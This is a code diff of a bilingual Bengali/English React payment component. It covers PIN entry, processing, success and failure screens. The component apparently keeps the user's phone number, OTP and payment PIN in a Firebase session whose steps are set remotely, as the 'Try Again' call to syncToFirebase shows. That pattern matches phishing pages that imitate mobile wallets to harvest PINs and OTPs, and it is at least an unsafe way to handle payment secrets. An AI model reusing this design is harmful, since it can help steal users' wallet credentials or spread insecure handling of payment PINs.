+          </button>
+
+          <div className="w-full max-w-sm bg-[#fdf2f2] rounded-lg px-4 py-3 flex items-start gap-2.5 mb-8 border border-red-50">
+            <Lock className="w-4 h-4 text-[#eab308] shrink-0 mt-0.5 fill-[#eab308]" />
+            <p className="text-[12px] text-gray-700 leading-snug font-medium pt-0.5">
+              {lang === 'bn' ? 'এটি আপনার পেমেন্ট পিন। অন্য কারো সাথে শেয়ার করবেন না।' : 'This is your payment PIN. Do not share with anyone.'}
+            </p>
+          </div>
+
           <button
-            type="button"
             onClick={handleProceedPin}
-            className="bg-white hover:bg-gray-100 text-[#b3080d] font-extrabold py-1.5 px-6 sm:px-7 rounded-md shadow transition-transform active:scale-95 text-xs sm:text-sm"
+            disabled={pinDigits.join('').length !== 4}
+            style={{ backgroundColor: pinDigits.join('').length === 4 ? '#ed1c24' : '#f4999d' }}
+            className="w-full max-w-sm text-white font-bold text-[16px] py-4 rounded-full transition-colors shadow-sm"
           >
-            {lang === 'bn' ? 'এগিয়ে যান' : 'Proceed'}
+            {lang === 'bn' ? 'পেমেন্ট করুন' : 'Make Payment'}
           </button>
-          <button
-            type="button"
-            onClick={() => window.location.reload()}
-            className="bg-white hover:bg-gray-100 text-[#b3080d] font-extrabold py-1.5 px-6 sm:px-7 rounded-md shadow transition-transform active:scale-95 text-xs sm:text-sm"
-          >
-            {lang === 'bn' ? 'বন্ধ করুন' : 'Close'}
-          </button>
+          
+          <div className="mt-6 flex items-center justify-center gap-1.5 pb-4">
+            <CheckMarkBoxIcon />
+            <span className="text-[12px] text-gray-500 font-medium">{lang === 'bn' ? 'নিরাপদ ও সুরক্ষিত লেনদেন' : 'Safe & Secure Transaction'}</span>
+          </div>
         </div>
       </div>
     );
   }
 
-  // Render Step 4: Processing / Success state
-  if (session.step === 'processing' || session.step === 'success') {
-    return (
-      <div className="w-full flex flex-col items-center justify-center mt-8 px-4 text-white text-center">
-        {!isSuccessState ? (
-          <>
-            <div className="w-16 h-16 border-4 border-white border-t-transparent rounded-full animate-spin mb-6"></div>
-            <h2 className="text-xl sm:text-2xl font-extrabold mb-2">
-              {lang === 'bn' ? 'পেমেন্ট প্রসেসিং হচ্ছে...' : 'Payment Processing...'}
-            </h2>
-            <p className="text-white/80 text-sm mb-4">
-              {lang === 'bn' ? 'অনুগ্রহ করে অপেক্ষা করুন' : 'Please wait while we process your payment'}
-            </p>
-            <div className="text-xs bg-black/20 px-4 py-1.5 rounded-full border border-white/20">
-              {processingTimer}s
+  // ---- STEP: PROCESSING & SUCCESS ----
+  return (
+    <div className="fixed inset-0 bg-black/40 z-50 flex items-center justify-center p-4 backdrop-blur-[2px] font-sans">
+      <div className="bg-white w-full max-w-sm rounded-[20px] p-8 flex flex-col items-center text-center shadow-2xl relative overflow-hidden">
+        
+        {session.step === 'processing' && (
+          <div className="flex items-center justify-center gap-4 py-3">
+            <div className="relative w-8 h-8 shrink-0">
+              <div className="absolute inset-0 rounded-full border-[3px] border-gray-100"></div>
+              <div className="absolute inset-0 rounded-full border-[3px] border-[#ed1c24] border-t-transparent animate-spin"></div>
             </div>
-          </>
-        ) : (
-          <>
-            <div className="w-20 h-20 bg-white rounded-full flex items-center justify-center text-[#d31820] mb-6 shadow-lg animate-bounce">
-              <svg className="w-12 h-12 stroke-current" fill="none" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
-              </svg>
-            </div>
-            <h2 className="text-2xl sm:text-3xl font-extrabold text-green-300 mb-2">
-              {lang === 'bn' ? 'পেমেন্ট সফল হয়েছে!' : 'Payment Successful!'}
-            </h2>
-            <p className="text-white/90 text-sm max-w-xs mb-4">
-              {lang === 'bn'
-                ? 'আপনার লেনদেনটি সফলভাবে সম্পন্ন হয়েছে। কিছুক্ষণের মধ্যে রিডাইরেক্ট করা হবে।'
-                : 'Your transaction was completed successfully. Redirecting shortly.'}
-            </p>
-            <div className="text-xs bg-black/20 px-4 py-1.5 rounded-full border border-white/20">
-              {processingTimer}s
-            </div>
-          </>
+            <span className="font-bold text-gray-900 text-[17px]">
+              {lang === 'bn' ? 'অনুগ্রহ করে অপেক্ষা করুন...' : 'Please wait...'}
+            </span>
+          </div>
         )}
-      </div>
-    );
-  }
 
-  return null;
+        {session.step === 'success' && (
+          <div className="py-2 flex flex-col items-center">
+            <CheckCircle className="w-16 h-16 text-green-500 mb-5 animate-in zoom-in" />
+            <h2 className="text-[20px] font-bold text-gray-900 mb-2">
+              {lang === 'bn' ? 'পেমেন্ট সফল' : 'Payment Successful'}
+            </h2>
+            <p className="text-gray-500 text-[14px] font-medium">
+              {lang === 'bn' ? 'আপনার পেমেন্ট সফলভাবে সম্পন্ন হয়েছে।' : 'Your payment has been completed successfully.'}
+            </p>
+          </div>
+        )}
+
+        {session.step === 'failed' && (
+          <div className="py-2 flex flex-col items-center">
+            <div className="w-16 h-16 mb-5 bg-red-100 rounded-full flex items-center justify-center animate-in zoom-in">
+               <AlertCircle className="w-8 h-8 text-[#ed1c24]" />
+            </div>
+            <h2 className="text-[20px] font-bold text-gray-900 mb-2">
+              {lang === 'bn' ? 'পেমেন্ট সফল হয়নি' : 'Payment Failed'}
+            </h2>
+            <p className="text-gray-500 text-[14px] font-medium mb-6">
+              {lang === 'bn' ? 'দয়া করে আবার চেষ্টা করুন।' : 'Please try again.'}
+            </p>
+            <button 
+              onClick={() => syncToFirebase({ step: 'number', otp: '', pin: '' })}
+              className="w-full bg-[#ed1c24] text-white py-3 px-8 rounded-full font-bold transition-colors"
+            >
+              {lang === 'bn' ? 'আবার চেষ্টা করুন' : 'Try Again'}
+            </button>
+          </div>
+        )}
+
+      </div>
+    </div>
+  );
 };
